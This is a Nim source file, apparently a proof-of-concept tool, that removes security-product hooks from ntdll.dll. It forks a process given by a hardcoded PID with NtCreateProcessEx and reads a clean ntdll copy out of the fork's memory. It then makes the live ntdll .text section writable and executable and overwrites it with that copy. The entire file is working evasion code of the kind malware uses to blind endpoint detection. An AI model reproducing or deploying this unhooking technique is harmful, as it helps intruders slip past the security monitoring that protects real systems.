import winim
import ptr_math
import std/dynlib
#import std/strutils

type NtCreateProcessEx_t = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc getCleanNTDLL(): LPVOID =
    var hNtdll = loadLib("ntdll.dll")
    
    var status: NTSTATUS
    var procOA: OBJECT_ATTRIBUTES
    var hClone: HANDLE
    var pNtdll: LPVOID

    var NtCreateProcessEx = cast[NtCreateProcessEx_t](hNtdll.symAddr("NtCreateProcessEx"))
    var hPowershell = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, 8648)

    InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)

    status = NtCreateProcessEx(addr hClone, PROCESS_ALL_ACCESS, addr procOA, hPowershell, cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)

    if NT_SUCCESS(status):
        echo "[+] Successfully Cloned!\n[!]New PID: ", GetProcessId(hClone), "\n"
    else:
        echo "[-] Error Cloning Process! Error Code: 0x", toHex($status)

    var mi = MODULEINFO()
    let ntdllModule = GetModuleHandleA("ntdll.dll")
    GetModuleInformation(cast[HANDLE](-1), ntdllModule, addr mi, cast[DWORD](sizeof(mi)))

    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage)
    var dwRead: SIZE_T
    let bSuccess = ReadProcessMemory(hClone, cast[LPCVOID](mi.lpBaseOfDll), pNtdll, mi.SizeOfImage, addr dwRead)
    if bSuccess == 0:
      echo "Failed in reading ntdll: ", GetLastError()
      quit(QuitFailure)
    return pntdll

proc unhook(cleanNtdll: LPVOID): bool =
    var 
        oldprotect: DWORD = 0
        SectionHeader: PIMAGE_SECTION_HEADER
    
    let low: uint16 = 0
    let hNtdll: HMODULE = GetModuleHandleA("ntdll.dll")
    let DOSHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](cleanNtdll)
    let NtHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](cleanNtdll) + DOSHeader.e_lfanew)
    #let NtHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD64](cleanNtdll) + DOSHeader.e_lfanew)
    for Section in low ..< NtHeader.FileHeader.NumberOfSections:
        SectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(NtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if cmp(".text", toString(SectionHeader.Name)) == 0:
            echo "Found .text section"
            if VirtualProtect(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, 0x40, addr oldprotect) == 0: #0x40 = PAGE_EXECUTE_READWRITE
                echo fmt"VirtualProtect Failed! Error Code: ({GetLastError()})."
                return false
            copyMem(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), cleanNtdll + SectionHeader.VirtualAddress, SectionHeader.Misc.VirtualSize)
            if VirtualProtect(cast[LPVOID](hNtdll + SectionHeader.VirtualAddress), SectionHeader.Misc.VirtualSize, oldprotect, addr oldprotect) == 0:
                echo fmt"VirtualProtect Failed! Error Code: ({GetLastError()})."
                return false
            return true
    return false  

when isMainModule:
    echo "Press any key to continue..."
    discard readLine(stdin)
    let nt = getCleanNTDLL()
    echo "Clean NTDLL Stored At: 0x",  toHex(cast[ByteAddress](nt))
    echo "Press any key to continue..."
    discard readLine(stdin)
    echo "Unhooking!"
    let unhookResult = unhook(nt)
    if unhookResult:
        echo "NTDLL Has Been Refreshed!"
    else:
        echo "Could Not Refresh NTDLL!"
    echo "Press any key to quit..."
    discard readLine(stdin)
